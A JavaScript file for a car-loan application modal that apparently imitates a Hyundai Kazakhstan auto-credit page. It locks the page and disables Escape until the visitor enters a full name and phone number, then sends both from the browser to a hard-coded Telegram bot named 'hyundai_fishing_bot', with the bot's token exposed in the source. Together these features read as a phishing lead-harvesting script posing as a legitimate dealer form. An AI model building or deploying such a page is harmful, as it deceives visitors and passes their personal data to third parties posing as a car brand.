/* ==========================================================================
   Модальное окно заявки на автокредитование.
   Пока клиент не оставит ФИО и телефон, страница заблокирована.
   ========================================================================== */
(function () {
  /* ---------- Настройки Telegram ---------- */
  // Токен бота от @BotFather (бот: @hyundai_fishing_bot)
  var TELEGRAM_BOT_TOKEN = '9117793742:AAHHx2x7Dh67NRhT78iwwwSJfTNZnVg6HCY';
  // Telegram ID менеджеров (или ID группы -100…). Каждый должен один раз нажать «Start» у бота.
  var TELEGRAM_CHAT_IDS = ['5416315021'];

  var overlay = document.getElementById('leadOverlay');
  if (!overlay) return;
  var site = document.getElementById('site');
  var form = document.getElementById('leadForm');
  var nameInput = document.getElementById('leadName');
  var phoneInput = document.getElementById('leadPhone');
  var consent = document.getElementById('leadConsent');
  var consentWrap = document.getElementById('leadConsentWrap');
  var submitBtn = document.getElementById('leadSubmit');

  /* ---------- Блокировка страницы ---------- */
  document.body.classList.add('lead-locked');
  site.setAttribute('inert', '');
  site.setAttribute('aria-hidden', 'true');

  /* ---------- Маска телефона +7 (XXX) XXX-XX-XX ---------- */
  var prevDigits = '';
  function digitsOf(value) {
    var d = value.replace(/\D/g, '');
    if (value.trim().indexOf('+7') === 0 || (d.length === 11 && /^[78]/.test(d))) d = d.slice(1); // код страны
    if (d.charAt(0) === '8') d = d.slice(1); // привычная «8» в начале номера
    return d.slice(0, 10);
  }
  function formatPhone(d) {
    if (!d.length) return '';
    var out = '+7 (' + d.slice(0, 3);
    if (d.length >= 3) out += ') ' + d.slice(3, 6);
    if (d.length >= 6) out += '-' + d.slice(6, 8);
    if (d.length >= 8) out += '-' + d.slice(8, 10);
    return out;
  }
  phoneInput.addEventListener('focus', function () { if (!phoneInput.value) phoneInput.value = '+7 ('; });
  phoneInput.addEventListener('input', function (e) {
    var deleting = e.inputType && e.inputType.indexOf('delete') === 0;
    var d = digitsOf(phoneInput.value);
    if (deleting && d === prevDigits) d = d.slice(0, -1); // стёрли скобку/дефис — стираем и цифру
    prevDigits = d;
    phoneInput.value = formatPhone(d) || '+7 (';
    if (rowOf(phoneInput).classList.contains('error')) validatePhone();
  });
  phoneInput.addEventListener('keydown', function (e) {
    if (e.key === 'Backspace' && phoneInput.selectionStart <= 4 && phoneInput.selectionEnd <= 4) e.preventDefault();
  });
  phoneInput.addEventListener('blur', function () {
    if (!digitsOf(phoneInput.value).length) { phoneInput.value = ''; prevDigits = ''; return; }
    validatePhone();
  });

  /* ---------- ФИО: только буквы (рус/каз/лат), пробел, дефис ---------- */
  nameInput.addEventListener('input', function () {
    var cleaned = nameInput.value
      .replace(/[^A-Za-zА-Яа-яЁёӘәҒғҚқҢңӨөҰұҮүҺһІі\s\-']/g, '')
      .replace(/\s{2,}/g, ' ');
    if (cleaned !== nameInput.value) nameInput.value = cleaned;
    if (rowOf(nameInput).classList.contains('error')) validateName();
  });
  nameInput.addEventListener('blur', function () { if (nameInput.value.trim()) validateName(); });

  /* ---------- Валидация ---------- */
  function rowOf(input) { return input.closest('.form-row'); }
  function setState(input, ok) {
    rowOf(input).classList.toggle('error', !ok);
    input.setAttribute('aria-invalid', String(!ok));
    return ok;
  }
  function validateName() {
    var parts = nameInput.value.trim().split(/\s+/).filter(function (p) { return p.replace(/[-']/g, '').length >= 2; });
    return setState(nameInput, parts.length >= 2);
  }
  function validatePhone() {
    // Казахстан: 10 цифр после +7, мобильные коды начинаются с 7
    return setState(phoneInput, /^7\d{9}$/.test(digitsOf(phoneInput.value)));
  }
  function validateConsent() {
    consentWrap.classList.toggle('error', !consent.checked);
    return consent.checked;
  }
  consent.addEventListener('change', validateConsent);

  /* ---------- Отправка в Telegram ----------
     Заявка уходит менеджерам напрямую из браузера через Telegram Bot API
     (настройки — в начале файла). */
  var formError = document.getElementById('leadFormError');
  var DEFAULT_ERROR = 'Не удалось отправить заявку. Проверьте интернет и попробуйте ещё раз или позвоните 7007.';

  function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }
  function buildMessage(lead) {
    var d = lead.phone; // +77011234567 → +7 701 123 45 67
    var phone = '+7 ' + d.slice(2, 5) + ' ' + d.slice(5, 8) + ' ' + d.slice(8, 10) + ' ' + d.slice(10, 12);
    var time = new Date().toLocaleString('ru-RU', {
      timeZone: 'Asia/Almaty', day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit'
    });
    return [
      '🚗 <b>Новая заявка на автокредит</b>',
      '',
      '👤 <b>ФИО:</b> ' + escapeHtml(lead.fullName),
      '📞 <b>Телефон:</b> ' + phone,
      '🕒 <b>Время:</b> ' + time,
      '🌐 <b>Страница:</b> ' + escapeHtml(lead.page)
    ].join('\n');
  }
  function sendToChat(chatId, text) {
    return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML', link_preview_options: { is_disabled: true } })
    }).then(function (res) {
      return res.json().catch(function () { return {}; }).then(function (data) {
        if (!data.ok) throw new Error(data.description || ('HTTP ' + res.status));
        return chatId;
      });
    });
  }

  /* Рассылает заявку всем менеджерам. Успех — если доставлено хотя бы одному. */
  function submitLead(lead) {
    if (lead.website) return Promise.resolve(); // бот заполнил поле-ловушку — молча игнорируем
    var text = buildMessage(lead);
    return Promise.allSettled(TELEGRAM_CHAT_IDS.map(function (id) { return sendToChat(id, text); }))
      .then(function (results) {
        var delivered = 0;
        results.forEach(function (r, i) {
          if (r.status === 'fulfilled') delivered++;
          else console.error('[Telegram] не доставлено в чат ' + TELEGRAM_CHAT_IDS[i] + ': ' + r.reason.message +
            (/chat not found/i.test(r.reason.message) ? ' — менеджер должен открыть бота и нажать «Start»' : ''));
        });
        if (!delivered) throw new Error(DEFAULT_ERROR);
      });
  }

  function showFormError(text) {
    formError.textContent = text || '';
    formError.hidden = !text;
  }

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    showFormError('');
    var ok = [validateName(), validatePhone(), validateConsent()].every(Boolean);
    if (!ok) {
      var firstBad = form.querySelector('.form-row.error .input-field');
      (firstBad || consent).focus();
      return;
    }
    submitBtn.disabled = true;
    submitBtn.textContent = 'Отправляем…';

    var lead = {
      fullName: nameInput.value.trim(),
      phone: '+7' + digitsOf(phoneInput.value),
      consent: consent.checked,
      website: form.elements.website.value, // скрытое поле-ловушка для ботов
      page: (location.host ? location.host + location.pathname + location.search : 'hyundai.kz/ru/avtokreditovanie/').slice(0, 300)
    };
    submitLead(lead).then(function () {
      var parts = lead.fullName.split(' ');
      document.getElementById('leadSuccessName').textContent = parts[1] || parts[0];
      document.getElementById('leadSuccessPhone').textContent = phoneInput.value;
      overlay.classList.add('is-done');
      document.getElementById('leadContinue').focus();
    }).catch(function (err) {
      // Страница остаётся заблокированной — заявку нужно отправить успешно
      showFormError(err instanceof TypeError ? DEFAULT_ERROR : err.message);
      submitBtn.disabled = false;
      submitBtn.textContent = 'Отправить заявку';
    });
  });

  /* ---------- Разблокировка ---------- */
  document.getElementById('leadContinue').addEventListener('click', function () {
    overlay.classList.add('is-hidden');
    document.body.classList.remove('lead-locked');
    site.removeAttribute('inert');
    site.removeAttribute('aria-hidden');
    setTimeout(function () { overlay.remove(); }, 300);
  });

  /* Окно нельзя закрыть клавишей Esc */
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && document.body.contains(overlay)) { e.preventDefault(); e.stopPropagation(); }
  }, true);

  setTimeout(function () { nameInput.focus({ preventScroll: true }); }, 400);
})();
